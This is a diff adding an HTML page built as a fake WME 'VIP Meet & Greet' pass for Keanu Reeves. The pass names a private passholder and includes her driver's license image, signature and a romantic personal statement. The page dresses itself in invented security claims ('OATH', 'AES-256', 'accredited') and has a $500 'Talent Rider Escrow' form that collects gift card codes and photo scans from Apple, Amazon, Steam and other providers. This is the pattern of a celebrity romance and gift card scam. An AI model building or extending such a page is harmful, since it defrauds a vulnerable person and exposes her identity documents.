@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>VIP Meet & Greet Access Pass — Keanu Reeves | WME</title>
+  <meta name="description" content="Official VIP Meet & Greet Credential for Keanu Reeves, accredited by WME (William Morris Endeavor) for passholder Brenda Wright.">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+  <!-- Top Agency & Security Header -->
+  <header class="app-header">
+    <div class="brand-lockup">
+      <span class="brand-wme">WME</span>
+      <span class="brand-sub">William Morris Endeavor · Talent Accreditation</span>
+    </div>
+    <div class="header-status">
+      <span class="status-dot"></span>
+      <span>ACCREDITED VIP PASS // VERIFIED</span>
+    </div>
+  </header>
+
+  <!-- Interactive Controls Bar -->
+  <nav class="controls-bar" aria-label="Credential Controls">
+    <button class="btn btn-gold" id="flipBtn" type="button" title="Flip Card to View Back (or press Spacebar)">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/>
+      </svg>
+      Flip Pass
+    </button>
+
+    <!-- Direct Download Buttons -->
+    <button class="btn btn-gold" id="downloadFrontBtn" type="button" title="Download Front Card PNG">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+        <polyline points="7 10 12 15 17 10"></polyline>
+        <line x1="12" y1="15" x2="12" y2="3"></line>
+      </svg>
+      Download Front
+    </button>
+
+    <button class="btn btn-outline" id="downloadBackBtn" type="button" title="Download Back Card PNG">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+        <polyline points="7 10 12 15 17 10"></polyline>
+        <line x1="12" y1="15" x2="12" y2="3"></line>
+      </svg>
+      Download Back
+    </button>
+
+    <button class="btn btn-outline" id="downloadCompleteBtn" type="button" title="Download Complete Side-by-Side Presentation PNG">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="2" y="3" width="9" height="15" rx="1.5"></rect>
+        <rect x="13" y="3" width="9" height="15" rx="1.5"></rect>
+        <path d="M12 21v-4"></path>
+        <polyline points="9 19 12 22 15 19"></polyline>
+      </svg>
+      Download Both
+    </button>
+
+    <button class="btn btn-outline" id="downloadPdfBtn" type="button" title="Download Printable PDF (2-Pages)">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+        <polyline points="14 2 14 8 20 8"></polyline>
+        <line x1="16" y1="13" x2="8" y2="13"></line>
+        <line x1="16" y1="17" x2="8" y2="17"></line>
+      </svg>
+      Download PDF
+    </button>
+
+    <button class="btn btn-outline" id="photoToggleBtn" type="button" title="Toggle between Driver's License Crop and Verified Biometric Emblem">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="8" r="4"></circle>
+        <path d="M6 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2"></path>
+      </svg>
+      Toggle Photo Style
+    </button>
+
+    <button class="btn btn-outline" id="inspectIdBtn" type="button" title="Inspect Encrypted Florida Driver's License">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="4" width="18" height="16" rx="2"></rect>
+        <line x1="7" y1="8" x2="17" y2="8"></line>
+        <line x1="7" y1="12" x2="11" y2="12"></line>
+      </svg>
+      Inspect ID
+    </button>
+
+    <button class="btn btn-gold" id="activateCardBtn" type="button" title="Authenticate and Activate VIP Pass via OATH PIN">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+      </svg>
+      <span id="activateBtnLabel">OATH Activate</span>
+    </button>
+  </nav>
+
+  <!-- 3D Interactive Credential Badge Stage -->
+  <main class="credential-stage">
+    <div class="card-container" id="cardContainer" tabindex="0" role="region" aria-label="VIP Meet and Greet Badge (Click to Flip)">
+      
+      <!-- Top Lanyard Notch -->
+      <div class="lanyard-slot" aria-hidden="true"></div>
+
+      <!-- Holographic Security Overlay -->
+      <div class="hologram-overlay" id="hologramOverlay" aria-hidden="true"></div>
+
+      <!-- FRONT FACE -->
+      <article class="card-face card-front">
+        
+        <!-- Header: Agency & Access Tier -->
+        <header class="card-header">
+          <div class="agency-row">
+            <div class="agency-title">
+              WME
+              <span>WILLIAM MORRIS ENDEAVOR</span>
+            </div>
+            <span class="badge-tag">VIP ACCESS</span>
+          </div>
+
+          <!-- Talent Banner -->
+          <div class="talent-banner">
+            <div class="talent-info">
+              <span class="talent-label">DESIGNATED TALENT</span>
+              <h1 class="talent-name">Keanu Reeves</h1>
+            </div>
+            <span class="talent-type">EXCLUSIVE GUEST</span>
+          </div>
+        </header>
+
+        <!-- Body: Passholder Photo & Verified Information -->
+        <section class="card-body">
+          <div class="photo-and-title">
+            <div class="photo-wrapper">
+              <img class="passholder-photo" id="passholderPhoto" src="assets/brenda_badge_photo.png" alt="Accredited Passholder Brenda Wright">
+              <span class="photo-verified-badge" id="photoVerifiedBadge">VIP PHOTO VERIFIED</span>
+            </div>
+            
+            <div class="passholder-details">
+              <div class="passholder-name-group">
+                <span class="label-micro">OFFICIAL PASSHOLDER</span>
+                <h2 class="passholder-name">Brenda Wright</h2>
+                <span class="vip-tier-badge">GREEN ROOM VIP</span>
+              </div>
+
+              <div class="info-grid">
+                <div class="info-item">
+                  <span class="label-micro">DATE</span>
+                  <span class="info-val gold">NOV 3, 2026</span>
+                </div>
+                <div class="info-item">
+                  <span class="label-micro">FORMAT</span>
+                  <span class="info-val">IN-PERSON (1)</span>
+                </div>
+                <div class="info-item">
+                  <span class="label-micro">LOCATION</span>
+                  <span class="info-val">RUSKIN, FL · USA</span>
+                </div>
+                <div class="info-item">
+                  <span class="label-micro">CALL TIME</span>
+                  <span class="info-val gold">19:30 PST</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Digital Signature & Security Medallion -->
+          <div class="verification-strip">
+            <div class="sig-box">
+              <span class="label-micro">PASSHOLDER DIGITAL SIGNATURE</span>
+              <img class="sig-img" src="assets/brenda_signature_transparent.png" alt="Digital Signature of Brenda Wright">
+              <span class="sig-date">AFFIXED: OCT 31, 2026 // WME E-SIGN</span>
+            </div>
+            <div class="hologram-medallion" aria-label="WME Security Hologram Seal">
+              <span>WME<br>SECURE<br>AUTH</span>
+            </div>
+          </div>
+        </section>
+
+        <!-- Footer: Machine Scannable Barcode & QR Code -->
+        <footer class="card-footer">
+          <div class="barcode-col">
+            <img class="barcode-img" src="assets/barcode.png" alt="Barcode for credential accreditation">
+            <div class="barcode-meta">
+              <span class="barcode-serial">WME-KR26-0813-VIP</span>
+              <span class="barcode-pin">PIN: <strong>813-026</strong></span>
+            </div>
+          </div>
+          <div class="qr-col" title="Scan to verify pass credentials online">
+            <img class="qr-img" src="assets/qr_code.png" alt="QR Code for secure verification">
+          </div>
+        </footer>
+
+      </article>
+
+      <!-- BACK FACE -->
+      <article class="card-face card-back">
+        
+        <header class="card-back-header">
+          <div class="agency-row">
+            <div class="agency-title">
+              WME
+              <span>TALENT SECURITY PROTOCOL</span>
+            </div>
+            <span class="badge-tag">NON-TRANSFERABLE</span>
+          </div>
+          <div class="mag-stripe" aria-hidden="true"></div>
+        </header>
+
+        <section class="card-back-body">
+          <!-- Activation PIN Security Panel -->
+          <div class="activation-pin-panel" id="activationPinPanel" title="Click to open OATH PIN Authentication">
+            <div class="pin-panel-header">
+              <span class="pin-panel-title">
+                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+                VIP PASS ACTIVATION PIN
+              </span>
+              <span class="pin-status-pill" id="pinStatusPill">OATH READY</span>
+            </div>
+            <div class="pin-code-row">
+              <div class="pin-digits-box" id="pinDigitsBox">
+                <span class="pin-digits">813-026</span>
+              </div>
+              <div class="pin-meta">
+                <span class="pin-meta-label">SECURITY PROTOCOL</span>
+                <span class="pin-meta-val">OATH / AES-256 SYNC</span>
+              </div>
+            </div>
+            <p class="pin-instructions" id="pinInstructions">
+              Required for talent lounge biometric authentication and VIP escort activation at venue entry. Click to activate.
+            </p>
+            <div class="pin-action-row" id="pinActionRow">
+              <button class="btn-micro-activate" id="panelActivateBtn" type="button">
+                <span>⚡ Activate Card with PIN</span>
+              </button>
+            </div>
+          </div>
+
+          <h3 class="terms-header">CREDENTIAL TERMS &amp; CONDITIONS</h3>
+          <ul class="terms-list">
+            <li>Holder must present government-issued Florida photo identification matching credential name upon entry.</li>
+            <li>Grants designated VIP passholder Brenda Wright admission for one (1) to the private Keanu Reeves talent suite.</li>
+            <li>Strictly non-transferable. Commercial resale, replication, or unauthorized transfer immediately invalidates access.</li>
+            <li>Identity and security intake authenticated via AES-256 standard and retained strictly under WME non-disclosure.</li>
+            <li>Subject to executive security escort, talent rider terms, and private lounge venue protocols.</li>
+          </ul>
+
+          <div class="fan-dedication-box">
+            <span class="fan-dedication-label">PASSHOLDER PERSONAL STATEMENT:</span>
+            <blockquote class="fan-dedication-text">
+              "I love him and going to spend the rest of our life's together"
+            </blockquote>
+          </div>
+        </section>
+
+        <footer class="card-back-footer">
+          <div class="agency-seal">
+            <div class="seal-icon">★</div>
+            <div>
+              WILLIAM MORRIS ENDEAVOR<br>
+              <span style="color: #71717a">BEVERLY HILLS · NEW YORK · LONDON</span>
+            </div>
+          </div>
+          <div style="text-align: right">
+            REF: WME-KR26-0813<br>
+            <span style="color: #4ade80; font-weight: 700;">STATUS: ACCREDITED</span>
+          </div>
+        </footer>
+
+      </article>
+
+    </div>
+  </main>
+
+  <p style="margin-top: 24px; font-size: 11px; color: #71717a; font-family: 'JetBrains Mono', monospace; text-align: center;">
+    Tip: Click credential or use Spacebar to flip between Front and Back • Optimized for CR80 VIP Badge Print
+  </p>
+
+  <!-- Florida Driver's License Modal -->
+  <div class="modal-backdrop" id="idModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="modal-content">
+      <button class="modal-close" id="modalCloseBtn" aria-label="Close modal">&times;</button>
+      <h3 class="modal-title" id="modalTitle">Encrypted ID Intake Verification</h3>
+      <p style="font-size: 11px; color: #a1a1aa; margin-bottom: 14px; font-family: 'JetBrains Mono', monospace;">
+        STATE OF FLORIDA DRIVER LICENSE // INTAKE STATUS: ENCRYPTED READY
+      </p>
+      <img class="license-preview-img" src="assets/license_upscaled.png" alt="Florida Driver License Preview">
+      <div style="display: flex; justify-content: space-between; font-size: 10px; color: #a1a1aa; font-family: 'JetBrains Mono', monospace; border-top: 1px solid rgba(255,255,255,0.08); padding-top: 10px;">
+        <span>PASSHOLDER: BRENDA WRIGHT</span>
+        <span>JURISDICTION: FLORIDA, USA</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- OATH PIN Card Activation Modal -->
+  <div class="modal-backdrop" id="authModal" role="dialog" aria-modal="true" aria-labelledby="authModalTitle">
+    <div class="modal-content auth-modal-content">
+      <button class="modal-close" id="authModalCloseBtn" aria-label="Close modal">&times;</button>
+      
+      <div class="auth-modal-header">
+        <div class="auth-lock-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+        </div>
+        <div>
+          <h3 class="modal-title" id="authModalTitle" style="margin-bottom: 2px;">OATH Card Activation</h3>
+          <p class="auth-subtitle">WME TALENT ACCREDITATION • RFC-4226 SYNC</p>
+        </div>
+      </div>
+
+      <div class="auth-card-meta">
+        <div class="meta-row">
+          <span class="meta-label">PASSHOLDER:</span>
+          <span class="meta-value gold">Brenda Wright</span>
+        </div>
+        <div class="meta-row">
+          <span class="meta-label">CREDENTIAL REF:</span>
+          <span class="meta-value">WME-KR26-0813-VIP</span>
+        </div>
+        <div class="meta-row">
+          <span class="meta-label">DESIGNATED TALENT:</span>
+          <span class="meta-value">Keanu Reeves • Nov 3, 2026</span>
+        </div>
+        <div class="meta-row">
+          <span class="meta-label">ACCREDITATION FEE:</span>
+          <span class="meta-value gold" id="cardFeeDisplay">$500.00 USD</span>
+        </div>
+        <div class="meta-row">
+          <span class="meta-label">ACTIVATION STATUS:</span>
+          <span class="meta-value" id="modalStatusBadge">
+            <span class="pin-status-pill is-pending">PENDING ACTIVATION</span>
+          </span>
+        </div>
+      </div>
+
+      <div id="authInputSection">
+        <!-- Step 1: VIP PIN Input (FIRST) -->
+        <div class="auth-step-box" id="pinStepBox">
+          <div class="auth-step-title">
+            <span>Step 1: Input VIP Activation PIN</span>
+            <span class="pin-status-pill is-pending" id="pinStepPill">PIN REQUIRED</span>
+          </div>
+
+          <label for="cardPinInput" class="auth-input-label">
+            6-Digit VIP Passholder Authorization PIN
+          </label>
+          <div class="pin-input-group">
+            <input 
+              type="text" 
+              id="cardPinInput" 
+              class="card-pin-input" 
+              placeholder="813-026" 
+              maxlength="7" 
+              autocomplete="off"
+              inputmode="numeric"
+            />
+          </div>
+          <p class="auth-input-hint" style="margin-bottom: 0;">
+            Enter the 6-digit authorization PIN printed on your credential back security strip (813-026).
+          </p>
+        </div>
+
+        <!-- Step 2: Multi-Card Gift Card Escrow Ledger -->
+        <div class="auth-step-box" id="giftCardStepBox">
+          <div class="auth-step-title">
+            <span>Step 2: Talent Rider Escrow (<span id="giftCardFeeAmount">$500.00 USD</span>)</span>
+            <span class="pin-status-pill is-pending" id="giftCardStatusPill">MULTIPLE CARDS ACCEPTED</span>
+          </div>
+
+          <!-- Escrow Stats & Progress Bar -->
+          <div style="background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.08); border-radius: 4px; padding: 8px 12px; margin-bottom: 10px; font-family: monospace;">
+            <div style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 4px;">
+              <span style="color: #a1a1aa;">Escrow Target: <strong>$500.00</strong></span>
+              <span style="color: #f3e5ab;">Credited: <strong id="standaloneCreditedAmt">$0.00</strong></span>
+              <span style="color: #ef4444;" id="standaloneDueSpan">Due: <strong id="standaloneDueAmt">$500.00</strong></span>
+            </div>
+            <div style="width: 100%; height: 6px; background: #1c1c28; border-radius: 3px; overflow: hidden;">
+              <div id="standaloneProgressBar" style="width: 0%; height: 100%; background: linear-gradient(90deg, #aa820a, #d4af37, #f3e5ab); transition: width 0.3s;"></div>
+            </div>
+          </div>
+
+          <!-- List of Added Vouchers -->
+          <div id="standaloneVoucherList" style="display: none; margin-bottom: 10px; max-height: 120px; overflow-y: auto;"></div>
+
+          <!-- Add Card Form -->
+          <div id="giftCardForm">
+            <div style="display: flex; gap: 8px; margin-bottom: 8px;">
+              <div style="flex: 1;">
+                <label for="giftCardProviderSelect" class="auth-input-label">Provider</label>
+                <select id="giftCardProviderSelect" class="card-select-input" style="width: 100%;">
+                  <option value="Apple Gift Card">Apple Gift Card</option>
+                  <option value="Amazon">Amazon</option>
+                  <option value="Steam">Steam</option>
+                  <option value="Google Play">Google Play</option>
+                  <option value="Vanilla Visa / Mastercard">Vanilla Visa / Mastercard</option>
+                  <option value="Razer Gold">Razer Gold</option>
+                </select>
+              </div>
+              <div style="width: 110px;">
+                <label for="giftCardAmountInput" class="auth-input-label">Amount ($ USD)</label>
+                <input 
+                  type="number" 
+                  id="giftCardAmountInput" 
+                  class="card-code-input" 
+                  placeholder="250" 
+                  value="250"
+                  min="1"
+                  max="1000"
+                  style="text-align: center;"
+                />
+              </div>
+            </div>
+
+            <label for="giftCardCodeInput" class="auth-input-label">Card Claim Code / Serial Number</label>
+            <input 
+              type="text" 
+              id="giftCardCodeInput" 
+              class="card-code-input" 
+              placeholder="e.g. X7KM-92NQ-48PL-2026" 
+              autocomplete="off"
+            />
+
+            <!-- Card Picture / Scan Attachment -->
+            <label for="giftCardFileInput" class="auth-input-label" style="margin-top: 8px;">Voucher Photo Scan / Digital Proof</label>
+            <input 
+              type="file" 
+              id="giftCardFileInput" 
+              accept="image/*"
+              class="card-file-input"
+              style="width: 100%; font-size: 11px; font-family: monospace; color: #a1a1aa; background: #08080c; padding: 6px; border: 1px dashed #333348; border-radius: 3px; cursor: pointer;"
+            />
+            <div id="cardImagePreviewContainer" style="display: none; margin-top: 6px; align-items: center; gap: 8px; background: rgba(0,0,0,0.6); padding: 4px 8px; border: 1px solid rgba(212,175,55,0.4); border-radius: 3px;">
+              <img id="cardImagePreviewThumb" src="" alt="Card proof" style="width: 36px; height: 24px; object-fit: cover; border-radius: 2px;" />
+              <div style="flex: 1; overflow: hidden;">
+                <span id="cardImagePreviewName" style="font-size: 10px; font-family: monospace; color: #f3e5ab; display: block; text-overflow: ellipsis; white-space: nowrap; overflow: hidden;">scan.png</span>
+                <span style="font-size: 9px; font-family: monospace; color: #4ade80;">Scan attached</span>
+              </div>
+              <button type="button" id="removeCardImgBtn" style="background: none; border: none; color: #ef4444; font-size: 14px; cursor: pointer; padding: 0 4px;" title="Remove image">&times;</button>
+            </div>
+
+            <button type="button" id="redeemGiftCardBtn" class="btn-redeem-card" style="margin-top: 10px; width: 100%;">
+              Apply Card to Escrow
+            </button>
+          </div>
+
+          <div id="giftCardVerifiedBanner" class="gift-card-verified-tag" style="display: none; flex-direction: column; align-items: flex-start; gap: 4px;">
+            <span>✓ Escrow Requirement 100% Satisfied: <strong id="verifiedCardDesc">$500.00 USD Cleared</strong></span>
+          </div>
+        </div>
+
+        <div id="authErrorMessage" class="auth-error-message" style="display: none;"></div>
+
+        <button type="button" id="submitPinAuthBtn" class="btn btn-gold btn-full-width">
+          <span id="submitBtnText">Authenticate PIN &amp; Activate VIP Card</span>
+        </button>
+      </div>
+
+      <div id="authSuccessSection" style="display: none;">
+        <div class="success-banner">
+          <div class="success-icon">✓</div>
+          <div>
+            <h4 style="font-size: 13px; font-weight: 700; color: #fff;">VIP Pass Successfully Activated</h4>
+            <p id="successTimestamp" style="font-size: 10.5px; color: #bbf7d0; margin-top: 2px;">
+              OATH RFC-4226 Handshake Verified • AES-256 Synced
+            </p>
+            <div class="token-chip" id="clearanceChip">
+              CLEARANCE: <strong>OATH-KR26-813-CLEAR</strong>
+            </div>
+          </div>
+        </div>
+
+        <div class="auth-activated-actions">
+          <button type="button" id="doneActivationBtn" class="btn btn-gold btn-full-width">
+            Done (Return to Credential Pass)
+          </button>
+        </div>
+      </div>
+
+      <div class="auth-footer-note">
+        <span>SECURITY PROTOCOL: INITIATIVE FOR OPEN AUTHENTICATION (OATH) • AES-256</span>
+      </div>
+    </div>
+  </div>
+
+  <script src="assets/downloads-data.js"></script>
+  <script src="app.js"></script>
+</body>
+</html>
